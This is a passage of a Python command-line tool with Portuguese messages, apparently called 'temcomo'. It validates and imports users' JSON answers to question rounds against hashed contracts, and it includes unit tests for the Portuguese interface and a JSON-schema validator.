             f"tenho como saber qual das duas é a verdadeira")

def _rodadas_na_pasta(pasta: Path, prefixo: str, rotulo: str):
    """(caminho, número) de cada rodada, varrendo a pasta INTEIRA.

    Um `glob` estreito não enxerga `04-Grill-rodada-2.json` nem `" 04-…json"` — e uma
    rodada que o reconciliador não vê é uma rodada aberta que ninguém conta, o que
    reabre exatamente a ambiguidade que a r2 dizia ter fechado. Aqui a varredura é
    imediata e quem *parece* uma rodada, mas não bate com o nome canônico, bloqueia."""
    try:
        nomes = sorted(p for p in pasta.iterdir() if p.is_file()) if pasta.exists() else []
    except OSError as e:
        fail(f"não consegui ler a pasta '{citar(pasta)}' — {motivo_do_sistema(e)}")
    achados = []
    for caminho in nomes:
        # para DETECTAR candidato, a régua é frouxa de propósito: sem espaço (nem os
        # internos) e sem diferença de caixa. Assim `04-Grill- rodada-2.json` entra na
        # conta e é barrado, em vez de sumir do reconciliador.
        dobrado = re.sub(r"\s+", "", caminho.name).casefold()
        if not (dobrado.startswith(re.sub(r"\s+", "", prefixo).casefold())
                and dobrado.endswith(".json")):
            continue                       # não se parece com rodada: não é problema meu
        # para ACEITAR, a régua é exata — inclusive o número canônico, sem zero à esquerda
        casado = re.fullmatch(rf"{re.escape(prefixo)}([1-9]\d*)\.json", caminho.name)
        if not casado:
            fail(f"'{rotulo}/{citar(caminho.name)}' parece uma rodada de grill mas não tem "
                 f"o nome exato que o motor escreve — enquanto ele estiver aí eu não "
                 f"consigo saber de que rodada é, e uma rodada invisível quebra a conta; "
                 f"o padrão é '{rotulo}/{prefixo}N.json', sem espaço, maiúscula ou zero "
                 f"à esquerda")
        achados.append((caminho, int(casado.group(1))))
    return achados

def conferir_respostas_de_grill_guardadas(pasta: Path, tarefa: dict,
                                          contratos: dict = None) -> set:
    """Confere TODA resposta de grill já guardada contra a rodada que a originou.

    Não é só para quem está importando: uma resposta incorporada continua tendo de
    corresponder ao contrato que ela diz ter respondido, senão a jornada segue de pé sobre
    um formulário que mudou. Por isso esta conferência entra na leitura da tarefa, e não
    apenas quando outra importação acontece (achado 1 da r3 da decisão 20).

    Devolve os números das rodadas que já têm resposta."""
    if contratos is None:
        contratos = {}
        nomes = {}
        for caminho, numero in _rodadas_na_pasta(pasta / "contratos", "04-grill-rodada-",
                                                 "contratos"):
            _conferir_nome_unico(nomes, numero, caminho, "contratos")
            corpo = carregar_e_validar(caminho)
            _conferir_vinculo(corpo, caminho, tarefa, numero)
            contratos[numero] = corpo

    respondidas, nome_da_resposta = set(), {}
    for caminho, numero in _rodadas_na_pasta(pasta / "respostas", "grill-rodada-",
                                             "respostas"):
        _conferir_nome_unico(nome_da_resposta, numero, caminho, "respostas")
        if numero not in contratos:
            fail(f"encontrei 'respostas/{citar(caminho.name)}' sem a rodada que a originou "
                 f"('contratos/04-grill-rodada-{numero}.json') — resposta sem pergunta é "
                 f"registro solto, e eu não continuo com a pasta nesse estado")
        guardada = carregar_e_validar(caminho)
        _conferir_vinculo(guardada, caminho, tarefa, numero)
        # A MESMA régua da importação: schema e vínculo não provam que esta resposta veio
        # das perguntas desta rodada — e o contrato pode ter sido editado depois.
        _conferir_respostas_do_grill(
            guardada, numero, contratos[numero],
            origem=f"a resposta guardada em 'respostas/{citar(caminho.name)}'")
        respondidas.add(numero)
    return respondidas

def reconciliar_grill(pasta: Path, tarefa: dict):
    """Qual rodada de grill está esperando resposta, conferindo o disco inteiro.

    O disco é a autoridade — mas autoridade que se lê por completo, não pelo nome dos
    arquivos: cada contrato e cada resposta já guardada são abertos e validados, e os
    vínculos (`tarefa_id`, número da rodada) têm de bater. Qualquer dúvida bloqueia;
    duas rodadas abertas ao mesmo tempo é dúvida, não um empate para o motor desfazer
    escolhendo a maior."""
    contratos, nome_do_contrato = {}, {}
    for caminho, numero in _rodadas_na_pasta(pasta / "contratos", "04-grill-rodada-",
                                             "contratos"):
        _conferir_nome_unico(nome_do_contrato, numero, caminho, "contratos")
        corpo = carregar_e_validar(caminho)
        _conferir_vinculo(corpo, caminho, tarefa, numero)
        contratos[numero] = corpo

    respondidas = conferir_respostas_de_grill_guardadas(pasta, tarefa, contratos)

    apontada = tarefa.get("rodada_de_grill_pendente")
    if apontada is not None and apontada not in contratos:
        fail(f"o registro da tarefa diz que a rodada {apontada} está esperando resposta, mas "
             f"não existe 'contratos/04-grill-rodada-{apontada}.json' — registro e disco "
             f"discordam, e eu não escolho um dos dois por conta própria")
    abertas = sorted(set(contratos) - respondidas)
    if not abertas:
        return None, None
    if len(abertas) > 1:
        # O registro NÃO desempata: ele é cache do motor, e cache não decide o que o disco
        # deixou ambíguo. Na r2 eu o usei como desempate para dar um papel ao campo; era o
        # motor escolhendo por conta própria com verniz de autoridade.
        fail(f"esta tarefa tem mais de uma rodada de grill aberta ao mesmo tempo "
             f"({', '.join(str(n) for n in abertas)}) — responda uma de cada vez; se a pasta "
             f"ficou assim por engano, tire do lugar a rodada que não vale mais")
    return abertas[0], contratos[abertas[0]]

def _conferir_nome_unico(vistos: dict, numero: int, caminho: Path, subpasta: str) -> None:
    """Dois nomes diferentes para a mesma rodada é ambiguidade, não sinônimo.

    'rodada-1' e 'rodada-01' viram o mesmo número; um sobrescreveria o outro no dicionário
    e o motor seguiria em frente sem nunca ler um dos dois arquivos."""
    if numero in vistos:
        fail(f"'{subpasta}/{citar(vistos[numero])}' e '{subpasta}/{citar(caminho.name)}' apontam "
             f"para a mesma rodada ({numero}) com nomes diferentes — enquanto os dois "
             f"existirem eu não tenho como saber qual vale; deixe só um")
    vistos[numero] = caminho.name

def _conferir_respostas_do_grill(export: dict, rodada, contrato: dict,
                                 origem: str = "a resposta") -> None:
    """A rodada só fecha completa: nem pergunta a menos, nem pergunta inventada, nem
    pergunta ainda sem decisão, nem opção que a página nunca ofereceu.

    Régua ÚNICA, usada nos dois momentos: quando a resposta chega (`importar_resposta`) e
    toda vez que ela é lida do disco (`reconciliar_grill`). Enquanto for uma função só,
    não há como os dois momentos discordarem — e foi discordarem que deixou passar
    contrato adulterado depois da importação. `origem` só troca o sujeito da frase.

    Recebe o contrato da rodada já lido e validado — reler aqui abriria espaço para as
    duas leituras divergirem."""
    _conferir_carimbo(export, contrato, f"04-grill-rodada-{rodada}.json", origem)
    perguntas = contrato.get("perguntas") or []
    opcoes_de = {p.get("id"): [o.get("id") for o in (p.get("opcoes") or [])] for p in perguntas}
    ordem = [p.get("id") for p in perguntas]
    respostas = export.get("respostas") or []
    respondidas = [r.get("pergunta_id") for r in respostas]

    faltando = [p for p in ordem if p not in respondidas]
    if faltando:
        fail(f"{origem} não cobre a rodada inteira: falta responder "
             f"{_lista_resumida(faltando)} — devolva o arquivo gerado pela própria "
             f"página, sem tirar perguntas")
    sobrando = [r for r in respondidas if r not in ordem]
    if sobrando:
        fail(f"{origem} traz pergunta que não é da rodada {rodada}: "
             f"{_lista_resumida(sobrando)} — confira se o arquivo é o dessa rodada")

    # Estar no arquivo não é ter respondido: `pendente` é a marca de "ainda não decidi".
    pendentes = [r.get("pergunta_id") for r in respostas if r.get("estado") == "pendente"]
    if pendentes:
        fail(f"{origem} tem pergunta ainda sem resposta: {_lista_resumida(pendentes)} — "
             f"responda tudo na página antes de exportar; se travou em alguma, marque a "
             f"dúvida em vez de deixar em branco")
    for resposta in respostas:
        escolha = resposta.get("escolha_id")
        pergunta = resposta.get("pergunta_id")
        if escolha is not None and escolha not in opcoes_de.get(pergunta, []):
            fail(f"em {origem}, a pergunta {_resumo(pergunta, 60)} escolheu "
                 f"{_resumo(escolha, 60)}, que não é uma das opções que a página ofereceu "
                 f"({_lista_resumida(opcoes_de.get(pergunta, []))}) — devolva o arquivo que "
                 f"a própria página gerou")

def _conferir_carimbo(export: dict, contrato: dict, nome_do_contrato: str,
                      origem: str = "a resposta") -> None:
    """O carimbo da resposta tem de bater com o contrato que ela diz ter respondido.

    Decisão 20 (2026-08-21), opção 1. Os identificadores dizem *sobre o quê* a
    pessoa respondeu; o carimbo diz *qual versão* ela leu. Sem ele, editar o texto de uma
    pergunta sem mexer no `pergunta_id` fazia a resposta guardada valer por algo que
    ninguém viu — era o achado que sobrou da Task 7.

    Régua única: vale na importação e em toda releitura do disco, pelos mesmos chamadores
    que já conferem perguntas e opções."""
    carimbado = export.get("contrato_sha256")
    atual = sha_do_contrato(contrato)
    if carimbado == atual:
        return
    fail(f"{origem} foi respondida a partir de uma versão diferente de "
         f"'{citar(nome_do_contrato)}': o formulário mudou depois que ela foi preenchida, "
         f"então as respostas podem não valer mais para o que está escrito ali agora. "
         f"Gere a página de novo com 'temcomo renderizar', responda outra vez e importe — "
         f"nada do que está guardado é apagado por isto."
         f"\n{ROTULO_RASTRO} carimbo da resposta {_resumo(carimbado, 70)}, "
         f"do contrato {_resumo(atual, 70)}")

def _conferir_direcao_escolhida(pasta: Path, export: dict, tarefa: dict) -> None:
    """A direção escolhida tem de ser uma das que o relatório ofereceu."""
    contrato = pasta / "contratos" / "03-direcoes.json"
    if not contrato.exists():
        fail(f"não encontrei 'contratos/03-direcoes.json' nesta tarefa — é o relatório que "
             f"gerou a página de direções, e sem ele eu não tenho como conferir se o caminho "
             f"escolhido é mesmo um dos que foram oferecidos")
    corpo = carregar_e_validar(contrato)
    _conferir_vinculo(corpo, contrato, tarefa)
    _conferir_carimbo(export, corpo, contrato.name)
    oferecidas = [d.get("id") for d in (corpo.get("direcoes") or [])]
    if export.get("direcao_escolhida") not in oferecidas:
        fail(f"a resposta escolheu {_resumo(export.get('direcao_escolhida'), 60)}, que não é "
             f"uma das direções do relatório ({_lista_resumida(oferecidas)}) — devolva o "
             f"arquivo que a própria página gerou")

def _conferir_resposta_contra_origem(pasta: Path, export: dict, tarefa: dict, versao: str,
                                     rodada, contrato_da_vez=None,
                                     origem: str = "a resposta") -> None:
    """Confere a resposta contra o contrato que está no disco AGORA.

    Régua única dos dois caminhos de `importar_resposta`: a importação normal e a
    retomada de uma importação que parou no meio. Elas divergiram uma vez — os gates
    semânticos moravam só no ramo de não-retomada, e o fluxo de recuperação que o próprio
    motor manda repetir entrava sem conferir nada. Enquanto for uma função só, não há
    ramo por onde escapar."""
    if versao == "decisao-direcoes-v1":
        if export.get("estado") != "decidida":
            fail(f"a escolha de direção ainda está {_resumo(export.get('estado'), 30)} — só "
                 f"dá para importar depois que você escolher um caminho na página e "
                 f"devolver de novo")
        _conferir_direcao_escolhida(pasta, export, tarefa)
        return
    if contrato_da_vez is None:
        # Retomada: a rodada já consta respondida, então `reconciliar_grill` não a
        # devolveria como aberta. O contrato vem pelo número que a própria resposta
        # declara — e é conferido igual.
        caminho = contrato_da_rodada(pasta, rodada)
        if not caminho.exists():
            fail(f"não encontrei a rodada {rodada} desta tarefa — falta "
                 f"'contratos/04-grill-rodada-{rodada}.json', que é a rodada que gerou a "
                 f"página")
        contrato_da_vez = carregar_e_validar(caminho)
        _conferir_vinculo(contrato_da_vez, caminho, tarefa, rodada)
    _conferir_respostas_do_grill(export, rodada, contrato_da_vez, origem)

def importar_resposta(arquivo, pasta) -> Path:
    """Valida a devolução do usuário, guarda em `respostas/` **byte a byte** e atualiza o
    registro da tarefa. Fail-closed: decisão pendente, rodada errada, resposta incompleta
    ou de outra tarefa bloqueiam sem gravar nada.

    Os bytes originais são preservados de propósito: o que o usuário devolveu é prova, e
    reescrever o arquivo (mesmo que só reordenando chaves) apagaria a forma original."""
    arquivo, pasta = Path(arquivo), Path(pasta)
    tarefa = carregar_tarefa(pasta)
    export = carregar_e_validar(arquivo)
    versao = export["schema_version"]
    if versao not in DESTINO_DA_RESPOSTA:
        fail(f"'{citar(arquivo)}' é um contrato '{_resumo(versao, 40)}', que não é resposta de ninguém — o "
             f"importar-resposta recebe: {', '.join(repr(v) for v in DESTINO_DA_RESPOSTA)}")
    if export.get("tarefa_id") != tarefa["tarefa_id"]:
        fail(f"esta resposta tem tarefa_id {_resumo(export.get('tarefa_id'), 60)}, que não é o "
             f"desta tarefa ({_resumo(tarefa['tarefa_id'], 60)}) — resposta de outra tarefa "
             f"não entra aqui")

    modelo, etapa_que_fecha = DESTINO_DA_RESPOSTA[versao]
    rodada = export.get("rodada")
    destino = pasta / modelo.format(rodada=rodada)

    # O destino é conferido ANTES dos gates da rodada: quem repete o comando precisa ouvir
    # "já foi importada", não "não há rodada aberta" — que é verdade, mas responde outra
    # pergunta. E bytes idênticos não são conflito: é a mesma prova voltando.
    try:
        bytes_novos = arquivo.read_bytes()
        ja_guardado = destino.read_bytes() if destino.exists() else None
    except OSError as e:
        fail(f"não consegui ler os arquivos da importação — {motivo_do_sistema(e)}")
    retomada = False
    if ja_guardado is not None:
        if ja_guardado != bytes_novos:
            fail(f"já existe uma resposta diferente guardada em '{citar(destino)}' — o registro da "
                 f"tarefa não é sobrescrito; se precisar corrigir, guarde a nova resposta com "
                 f"outro nome e registre o motivo")
        if _registro_ja_reflete(tarefa, versao, rodada):
            # "já importada" só depois de provar que CONTINUA correspondente: o contrato
            # pode ter mudado desde a importação, e responder "não há nada a fazer" seria
            # avalizar uma resposta que já não corresponde (achado 1 da r3).
            _conferir_resposta_contra_origem(
                pasta, export, tarefa, versao, rodada,
                origem=f"a resposta guardada em '{citar(destino.name)}'")
            fail(f"esta resposta já foi importada e está guardada em '{citar(destino)}' — não há "
                 f"nada a fazer de novo")
        # Mesma prova, registro ainda por atualizar: é uma importação que parou no meio
        # (falta de espaço, queda de energia). Retomar é concluir, não repetir.
        retomada = True

    if retomada:
        # Concluir não é pular: a resposta é reconferida contra o contrato de AGORA, que
        # pode ter mudado entre a gravação parcial e esta segunda chamada.
        _conferir_resposta_contra_origem(
            pasta, export, tarefa, versao, rodada,
            origem="a resposta que ficou guardada pela metade")
    else:
        contrato_da_vez = None
        if versao != "decisao-direcoes-v1":
            esperada, contrato_da_vez = reconciliar_grill(pasta, tarefa)
            if esperada is None:
                fail(f"esta tarefa não tem rodada de grill esperando resposta — gere a rodada "
                     f"com 'temcomo renderizar' antes de importar")
            if rodada != esperada:
                fail(f"esta resposta é da rodada {rodada}, mas a rodada aberta desta tarefa é a "
                     f"{esperada} — confira o arquivo que você devolveu")
        _conferir_resposta_contra_origem(pasta, export, tarefa, versao, rodada,
                                         contrato_da_vez)
        try:
            destino.parent.mkdir(parents=True, exist_ok=True)
            destino.write_bytes(bytes_novos)           # byte a byte: é prova, não rascunho
        except OSError as e:
            fail(f"não consegui guardar a resposta em '{citar(destino)}' — {motivo_do_sistema(e)}")

    # Daqui para baixo tudo é idempotente: se falhar, repetir o comando retoma daqui — e é
    # por isso que a falha do sistema aqui pode virar recado, e não rastro de programa.
    try:
        if etapa_que_fecha and ETAPAS.index(tarefa["etapa"]) + 1 == ETAPAS.index(etapa_que_fecha):
            avancar_etapa(pasta, etapa_que_fecha, por="usuario (resposta importada)")
        elif versao == "grill-respostas-v1" and tarefa.get("rodada_de_grill_pendente") is not None:
            registro = carregar_tarefa(pasta)
            registro["rodada_de_grill_pendente"] = None
            gravar_tarefa(pasta, registro)
    except OSError as e:
        fail(f"a resposta está guardada em '{citar(destino)}', mas não consegui anotar isso no "
             f"registro da tarefa — {motivo_do_sistema(e)}. Resolva e rode o mesmo comando "
             f"de novo: eu retomo de onde parei, sem duplicar nada")
    return destino

def _registro_ja_reflete(tarefa: dict, versao: str, rodada) -> bool:
    """O registro da tarefa já incorporou esta resposta? É o que separa 'já importei isso'
    de 'copiei os bytes mas não cheguei a anotar' — e só o segundo caso pode ser retomado."""
    if versao == "decisao-direcoes-v1":
        return ETAPAS.index(tarefa["etapa"]) >= ETAPAS.index("direcao-escolhida")
    return tarefa.get("rodada_de_grill_pendente") != rodada

def cmd_importar_resposta(args):
    pasta = resolver_tarefa(args.tarefa, args.raiz)
    destino = importar_resposta(args.arquivo, pasta)
    print(f"Resposta guardada em '{citar(destino)}'.\n")
    print(resumo_da_tarefa(pasta))

def resumo_da_tarefa(pasta) -> str:
    """Em que pé está: etapa atual, o que já passou, o que falta e o próximo comando."""
    pasta = Path(pasta)
    tarefa = carregar_tarefa(pasta)
    atual = tarefa["etapa"]
    posicao = ETAPAS.index(atual)
    # o objetivo e o histórico vêm do arquivo da tarefa: são dado, e dado citado passa
    # pelo funil antes de chegar ao terminal de quem lê (r3/achado 3)
    linhas = [f"Tarefa: {citar(tarefa['tarefa_id'])}",
              f"Objetivo: {citar(tarefa['objetivo_resumido'])}",
              f"Etapa atual: {atual} ({posicao + 1} de {len(ETAPAS)})",
              "", "Já passou por:"]
    for passo in tarefa.get("historico", []):
        contrato = f" · {citar(passo['contrato'])}" if passo.get("contrato") else ""
        linhas.append(f"  ✓ {citar(passo['etapa'])} — em {citar(passo['em'])}{contrato}")
    faltam = ETAPAS[posicao + 1:]
    if faltam:
        linhas += ["", "Falta:"]
        for etapa in faltam:
            arquivo, versao, significado = GATE_DA_ETAPA[etapa]
            satisfeito, motivo = avaliar_gate(pasta, etapa, tarefa)
            situacao = "pronto para concluir" if satisfeito else motivo
            linhas.append(f"  • {etapa} — {significado}")
            linhas.append(f"      {situacao}")
        proxima = faltam[0]
        linhas += ["", "Próxima ação:",
                   f"  1. produza '{GATE_DA_ETAPA[proxima][0]}' (contrato "
                   f"'{GATE_DA_ETAPA[proxima][1]}')",
                   f"  2. confira com:  temcomo validar {pasta / GATE_DA_ETAPA[proxima][0]}",
                   f"  3. avance com:   temcomo concluir-etapa {citar(pasta)} {proxima}"]
    else:
        linhas += ["", "A jornada desta tarefa está terminada — todas as etapas foram "
                   "concluídas com o contrato validado."]
    return "\n".join(linhas)

def cmd_nova_tarefa(args):
    produzido_por = {"agente": args.agente, "modelo": args.modelo,
                     "sessao_id": args.sessao, "transcript_jsonl": args.transcript}
    pasta = criar_tarefa(args.raiz, args.objetivo, args.data, produzido_por)
    print(f"Tarefa criada em '{citar(pasta)}'.\n")
    print(resumo_da_tarefa(pasta))

def cmd_status(args):
    print(resumo_da_tarefa(resolver_tarefa(args.tarefa, args.raiz)))

def cmd_concluir_etapa(args):
    pasta = resolver_tarefa(args.tarefa, args.raiz)
    tarefa = avancar_etapa(pasta, args.etapa, args.data, args.por)
    print(f"OK — etapa '{tarefa['etapa']}' concluída, com o contrato conferido.\n")
    print(resumo_da_tarefa(pasta))

def cmd_nao_implementado(_args):
    fail("subcomando ainda não implementado")

class TestFundacao(unittest.TestCase):
    def test_versao_semver(self):
        partes = ENGINE_VERSION.split(".")
        self.assertEqual(len(partes), 3)
        self.assertTrue(all(p.isdigit() for p in partes))
    def test_validar_existe(self):
        self.assertTrue(callable(cmd_validar))  # falha até a Task 3

class TestInterfacePtBr(unittest.TestCase):
    """A interface visível é 100% PT-BR e cada subcomando tem assinatura própria."""

    def _erro(self, argv):
        saida = io.StringIO()
        with contextlib.redirect_stderr(saida), self.assertRaises(SystemExit) as ctx:
            construir_parser().parse_args(argv)
        return ctx.exception.code, saida.getvalue()

    def test_autoteste_nao_aceita_argumento(self):
        codigo, msg = self._erro(["autoteste", "lixo"])
        self.assertEqual(codigo, 1)
        self.assertIn("não reconhecidos", msg)

    def test_validar_exige_contrato(self):
        codigo, msg = self._erro(["validar"])
        self.assertEqual(codigo, 1)
        self.assertIn("obrigatórios", msg)

    def test_subcomando_inexistente(self):
        _, msg = self._erro(["inventado"])
        self.assertIn("subcomando inexistente", msg)

    def test_sem_subcomando(self):
        _, msg = self._erro([])
        self.assertIn("subcomando", msg)

    def test_mensagens_de_erro_sem_ingles(self):
        _, msg = self._erro(["inventado"])
        for termo in ("usage:", "error:", "invalid choice", "choose from", "argument "):
            self.assertNotIn(termo, msg, f"resto de inglês na interface: {termo!r}")
        self.assertIn("uso: temcomo", msg)

    def test_texto_de_uso_sem_ingles(self):
        for termo in ("usage:", "optional arguments", "positional arguments", "show this help"):
            self.assertNotIn(termo, USO, f"resto de inglês no texto de uso: {termo!r}")

    def test_uso_e_erros_sem_vocabulario_em_ingles(self):
        self.assertEqual(achar_ingles(USO), [], "resto de inglês no texto de uso")
        # todos os erros que a gramática atual do parser sabe produzir
        for argv in ([], ["inventado"], ["validar"], ["autoteste", "lixo"],
                     ["status", "a", "b"], ["validar", "--opcao-que-nao-existe"]):
            _, msg = self._erro(argv)
            self.assertEqual(achar_ingles(msg), [], f"resto de inglês no erro de {argv}")
            self.assertTrue(msg.startswith("ERRO: "), msg)

    def test_palavra_inteira_no_detector_de_ingles(self):
        self.assertEqual(achar_ingles("argumentos obrigatórios"), [])   # PT-BR passa
        self.assertEqual(achar_ingles("the following argument"), ["argument"])

    def test_prosa_fixa_do_programa_sem_ingles(self):
        # varre a prosa na origem (constantes e gabaritos), sem interpolação:
        # não há como um dado do usuário mascarar uma palavra do programa.
        fixas = [USO, ROTULO_RASTRO, traduzir_erro_argparse("sem gabarito para isto")]
        fixas += [modelo for _, modelo in GABARITOS_ARGPARSE]
        for texto in fixas:
            self.assertEqual(achar_ingles(texto), [], texto)

    def test_dado_do_usuario_nao_reprova_a_prosa(self):
        _, msg = self._erro(["autoteste", "--", "--help"])
        self.assertIn("argumentos não reconhecidos", msg)   # prosa em PT-BR
        self.assertIn("--help", msg)                        # dado ecoado intacto

    def test_sem_citacoes_e_motivo_do_erro(self):
        self.assertEqual(sem_citacoes("valor 'file' não aceito"), "valor '…' não aceito")
        self.assertEqual(motivo_do_erro("$.file: campo 'help' não previsto"),
                         "campo '…' não previsto")

    def test_token_do_usuario_nao_e_traduzido(self):
        # o que o usuário digitou é dado: ecoa intacto, mesmo sendo inglês
        for digitado in ("invalid choice:", "argument foo", "choose from"):
            _, msg = self._erro([digitado])
            self.assertIn(f"'{digitado}'", msg, f"token do usuário alterado: {digitado!r}")
            self.assertIn("subcomando inexistente", msg)

    def test_separador_fim_de_opcoes(self):
        # depois de "--", "--ajuda" é dado do usuário, não pedido de ajuda
        erro = io.StringIO()
        with contextlib.redirect_stderr(erro), self.assertRaises(SystemExit) as ctx:
            main(["validar", "--", "--ajuda"])
        self.assertEqual(ctx.exception.code, 1)
        self.assertIn("arquivo não encontrado", erro.getvalue())
        self.assertIn("--ajuda", erro.getvalue())      # foi tratado como nome de arquivo

    def test_ajuda_nao_mascara_subcomando_invalido(self):
        erro = io.StringIO()
        with contextlib.redirect_stderr(erro), self.assertRaises(SystemExit) as ctx:
            main(["inventado", "--ajuda"])
        self.assertEqual(ctx.exception.code, 1)
        self.assertIn("subcomando inexistente", erro.getvalue())

    def test_ajuda_nao_sequestra_argumento_do_usuario(self):
        saida = io.StringIO()
        with contextlib.redirect_stdout(saida), self.assertRaises(SystemExit) as ctx:
            main(["ajuda"])
        self.assertEqual(ctx.exception.code, 0)
        self.assertIn("uso: temcomo", saida.getvalue())
        # "ajuda" como argumento é dado do usuário, não pedido de ajuda:
        erro = io.StringIO()
        with contextlib.redirect_stderr(erro), self.assertRaises(SystemExit):
            main(["validar", "ajuda"])
        self.assertIn("arquivo não encontrado", erro.getvalue())
        self.assertIn("ajuda", erro.getvalue())        # dado do usuário, não pedido de ajuda

    def test_ajuda_lista_opcoes_das_barreiras(self):
        # As skills mandam conferir pela ajuda se o motor tem --data e --tarefa.
        # Se o texto de uso não as exibir, a conferência publicada é impossível.
        self.assertIn("--data", USO, "o texto de uso não lista a opção --data")
        self.assertIn("--tarefa", USO, "o texto de uso não lista a opção --tarefa")
        saida = io.StringIO()
        with contextlib.redirect_stdout(saida), self.assertRaises(SystemExit) as ctx:
            main(["importar-resposta", "--ajuda"])
        self.assertEqual(ctx.exception.code, 0,
                         "a ajuda de importar-resposta não saiu com código 0")
        self.assertIn("--tarefa", saida.getvalue(),
                      "a ajuda de importar-resposta não mostra a opção --tarefa")

    def test_assinaturas_por_subcomando(self):
        p = construir_parser()
        self.assertIsNone(p.parse_args(["status"]).tarefa)          # opcional
        self.assertEqual(p.parse_args(["validar", "c.json"]).contrato, "c.json")
        self.assertEqual(p.parse_args(["nova-tarefa", "obj"]).objetivo, "obj")
        self.assertFalse(hasattr(p.parse_args(["autoteste"]), "alvo"))

class TestValidador(unittest.TestCase):
    S = {"type": "object", "required": ["nome"], "additionalProperties": False,
         "properties": {"nome": {"type": "string", "minLength": 1},
                        "nivel": {"enum": ["a", "b"]},
                        "itens": {"type": "array", "minItems": 1,
                                   "items": {"type": "integer", "minimum": 0}}}}
    def test_valido(self):
        self.assertEqual(validar_contra_schema({"nome": "x", "nivel": "a", "itens": [1]}, self.S), [])
    def test_required(self):
        self.assertIn("$.nome", ";".join(validar_contra_schema({}, self.S)))
    def test_enum_e_extra(self):
        erros = ";".join(validar_contra_schema({"nome": "x", "nivel": "z", "foo": 1}, self.S))
        self.assertIn("$.nivel", erros); self.assertIn("$.foo", erros)
    def test_item_invalido(self):
        self.assertIn("$.itens[0]", ";".join(
            validar_contra_schema({"nome": "x", "itens": [-1]}, self.S)))

class TestValidadorCobertura(unittest.TestCase):
    """Os demais operadores previstos na Task 2, um a um."""

    def test_tipos_basicos(self):
        self.assertEqual(validar_contra_schema(None, {"type": "null"}), [])
        self.assertEqual(validar_contra_schema(True, {"type": "boolean"}), [])
        self.assertEqual(validar_contra_schema(1.5, {"type": "number"}), [])
        self.assertEqual(validar_contra_schema(2, {"type": "number"}), [])
        self.assertEqual(validar_contra_schema({}, {"type": "object"}), [])
        self.assertNotEqual(validar_contra_schema(1.5, {"type": "integer"}), [])

    def test_booleano_nao_conta_como_numero(self):
        for schema in ({"type": "integer"}, {"type": "number"}):
            self.assertNotEqual(validar_contra_schema(True, schema), [], schema)
        self.assertNotEqual(validar_contra_schema(1, {"type": "boolean"}), [])

    def test_tipo_multiplo_para_campo_anulavel(self):
        s = {"type": ["string", "null"]}          # ex.: item_id das anotações
        self.assertEqual(validar_contra_schema(None, s), [])
        self.assertEqual(validar_contra_schema("x", s), [])
        self.assertNotEqual(validar_contra_schema(3, s), [])

    def test_limites_de_texto_e_de_numero(self):
        self.assertNotEqual(validar_contra_schema("", {"type": "string", "minLength": 1}), [])
        self.assertNotEqual(validar_contra_schema("abcd", {"type": "string", "maxLength": 3}), [])
        self.assertEqual(validar_contra_schema("abc", {"type": "string", "maxLength": 3}), [])
        self.assertNotEqual(validar_contra_schema(5, {"type": "integer", "maximum": 4}), [])
        self.assertNotEqual(validar_contra_schema(3, {"type": "integer", "minimum": 4}), [])
        self.assertEqual(validar_contra_schema(4, {"type": "integer", "minimum": 4, "maximum": 4}), [])

    def test_pattern_e_const(self):
        data = {"type": "string", "pattern": r"^\d{4}-\d{2}-\d{2}$"}
        self.assertEqual(validar_contra_schema("2026-08-20", data), [])
        self.assertNotEqual(validar_contra_schema("ontem", data), [])
        self.assertEqual(validar_contra_schema("direcoes-v1", {"const": "direcoes-v1"}), [])
        self.assertNotEqual(validar_contra_schema("outra", {"const": "direcoes-v1"}), [])

    def test_igualdade_estrita_em_const_e_enum(self):
        self.assertNotEqual(validar_contra_schema(True, {"const": 1}), [])
        self.assertNotEqual(validar_contra_schema(True, {"enum": [1, 2]}), [])
        self.assertNotEqual(validar_contra_schema(0, {"enum": [False]}), [])

    def test_array_com_limites_e_itens(self):
        s = {"type": "array", "minItems": 1, "maxItems": 2, "items": {"type": "string"}}
        self.assertEqual(validar_contra_schema(["a"], s), [])
        self.assertNotEqual(validar_contra_schema([], s), [])
        self.assertNotEqual(validar_contra_schema(["a", "b", "c"], s), [])
        self.assertIn("$[1]", ";".join(validar_contra_schema(["a", 2], s)))

    def test_caminho_de_erro_aninhado(self):
        s = {"type": "object", "properties": {"a": {"type": "array", "items": {
            "type": "object", "required": ["b"], "properties": {"b": {"type": "integer"}}}}}}
        self.assertIn("$.a[0].b", ";".join(validar_contra_schema({"a": [{"b": "x"}]}, s)))
        self.assertIn("$.a[0].b", ";".join(validar_contra_schema({"a": [{}]}, s)))

    def test_additional_properties_true_aceita_extra(self):
        s = {"type": "object", "properties": {"a": {"type": "string"}}}
        self.assertEqual(validar_contra_schema({"a": "x", "extra": 1}, s), [])

    def test_acumula_todos_os_erros(self):
        erros = validar_contra_schema({"nivel": "z", "foo": 1, "itens": []}, TestValidador.S)
        self.assertGreaterEqual(len(erros), 3)   # nome ausente + nivel + foo + itens vazio

    def test_nunca_lanca_excecao(self):
        for dado in (None, 3, "x", [], {}, {"nome": 1, "itens": "não é lista"}, [[{}]]):
            self.assertIsInstance(validar_contra_schema(dado, TestValidador.S), list, dado)

    def test_erros_em_ptbr(self):
        erros = validar_contra_schema({"nivel": "z", "foo": 1, "itens": [-1]}, TestValidador.S)
        self.assertTrue(erros)
        for erro in erros:
            self.assertRegex(erro, r"^\$[^:]*: .+")                    # "caminho: motivo"
            self.assertEqual(achar_ingles(motivo_do_erro(erro)), [], erro)

class TestValidadorFailClosed(unittest.TestCase):
    """Disposição da revisão r1 da Task 2: igualdade recursiva, definição de
    formato quebrada reprovando fechado, semântica de `integer` e profundidade."""

    def test_igualdade_recursiva_em_const_e_enum(self):                     # A1
        self.assertNotEqual(validar_contra_schema([True], {"const": [1]}), [])
        self.assertNotEqual(validar_contra_schema({"x": False}, {"const": {"x": 0}}), [])
        self.assertNotEqual(validar_contra_schema([True], {"enum": [[1]]}), [])
        self.assertNotEqual(validar_contra_schema([1, 2], {"const": [1, 2, 3]}), [])
        self.assertNotEqual(validar_contra_schema({"a": 1}, {"const": {"a": 1, "b": 2}}), [])
        self.assertNotEqual(validar_contra_schema({"a": 1}, {"const": {"b": 1}}), [])
        self.assertEqual(validar_contra_schema([1, {"a": [2]}], {"const": [1, {"a": [2]}]}), [])
        self.assertEqual(validar_contra_schema({"x": [False]}, {"enum": [{"x": [False]}]}), [])

    def test_definicao_quebrada_reprova_fechado(self):                      # A2
        casos = (
            ({"nome": "x"}, {"type": "object", "properties": {"nome": "não é subdefinição"}}),
            ({"nome": "x"}, {"type": "object", "properties": "nem isto"}),
